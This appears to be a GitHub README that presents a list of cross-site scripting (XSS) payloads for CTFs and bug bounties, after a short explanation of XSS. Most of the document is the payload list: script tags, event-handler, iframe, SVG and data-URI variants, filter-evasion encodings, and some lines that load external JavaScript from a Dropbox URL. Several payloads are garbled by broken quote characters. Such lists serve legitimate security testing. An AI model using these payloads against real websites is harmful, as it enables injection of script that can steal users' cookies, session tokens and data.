<h1 align="center">Welcome 👋</h1>
<p>
  <img alt="Version" src="https://img.shields.io/badge/version-0.1-blue.svg?cacheSeconds=2592000" />
  <a href="https://twitter.com/Acty123" target="_blank">
    <img alt="Twitter: Acty123" src="https://img.shields.io/twitter/follow/Acty123.svg?style=social" />
  </a>
</p>

## What's here ?

```
A list of XSS payloads to help you during ctfs, bug bounties,...
This is just a start, I will update the list regularly (At list I will try 👀)
```

## What's XSS ?

```
Overview :
Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted web sites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.

An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page. For more details on the different types of XSS flaws, see: Types of Cross-Site Scripting.
```
## The payloads

```
<script>alert(123);</script>
<ScRipT>alert("XSS");</ScRipT>
<script>alert(123)</script>
<script>alert("hellox worldss");</script>
<script>alert(�XSS�)</script> 
<script>alert(�XSS�);</script>
<script>alert(�XSS�)</script>
�><script>alert(�XSS�)</script>
<script>alert(/XSS�)</script>
<script>alert(/XSS/)</script>
</script><script>alert(1)</script>
�; alert(1);
�)alert(1);//
<ScRiPt>alert(1)</sCriPt>
<IMG SRC=jAVasCrIPt:alert(�XSS�)>
<IMG SRC=�javascript:alert(�XSS�);�>
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
<IMG SRC=javascript:alert(�XSS�)>      
<img src=xss onerror=alert(1)>


<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>

<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'

<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"

<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}

<img/src=`%00` onerror=this.onerror=confirm(1)

<form><isindex formaction="javascript&colon;confirm(1)"

<img src=`%00`&NewLine; onerror=alert(1)&NewLine;

<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>

<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?

<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">

<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/

&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00

<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">

<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>

<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script

<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}

<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>

```

## Author

👤 **Acty**

- Twitter: [@Acty123](https://twitter.com/Acty123)
- Github: [@Actyy](https://github.com/Actyy)
